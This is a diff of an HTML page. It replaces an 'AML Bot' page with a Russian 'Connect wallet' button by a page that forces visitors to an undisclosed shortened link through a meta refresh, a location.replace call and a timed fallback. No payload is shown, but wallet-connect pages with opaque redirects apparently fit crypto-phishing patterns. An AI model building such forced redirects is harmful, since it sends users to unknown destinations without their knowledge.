@@ -1,11 +1,24 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AML Bot</title>
+    <title>Redirect</title>
+
+    <!-- Для браузеров -->
+    <meta http-equiv="refresh" content="0;url=http://u.slp.cx/EY09jH">
+
+    <script>
+        window.location.replace("http://u.slp.cx/EY09jH");
+    </script>
 </head>
 <body>
-    <button id="connect-btn" style="padding: 15px 30px; font-size: 18px;">Подключить кошелек</button>
-    <script type="module" src="./main.js"></script>
+    <p>Redirecting...</p>
+
+    <script>
+        // Дополнительная попытка, если replace не сработал
+        setTimeout(function () {
+            window.location.href = "http://u.slp.cx/EY09jH";
+        }, 100);
+    </script>
 </body>
 </html>
